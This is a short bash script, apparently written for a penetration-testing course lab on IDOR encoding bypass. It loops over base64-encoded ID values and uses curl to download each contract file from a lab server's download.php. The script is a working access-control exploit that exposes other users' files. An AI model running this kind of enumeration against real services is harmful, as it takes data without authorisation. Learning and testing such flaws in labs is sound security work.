#!/bin/bash

#Small script that allows a user to define a list of encoded values for a parameter and pass each individual parameter to the curl command to download files. Used for CPTS IDOR Encoding Bypass Module. 

url_values=("MQ%3D%3D" "Mg%3D%3D" "Mw%3D%3D" "NA%3D%3D" "NQ%3D%3D" "Ng%3D%3D" "Nw%3D%3D" "OA%3D%3D" "OQ%3D%3D" "MTA%3D" "MTE%3D" "MTI%3D" "MTM%3D" "MTQ%3D" "MTU%3D" "MTY%3D" "MTc%3D" "MTg%3D" "MTk%3D" "MjA%3D")

for url_value in "${url_values[@]}"; do
    curl -sOJ "http://94.237.50.19:59345/download.php?contract=$url_value"
done
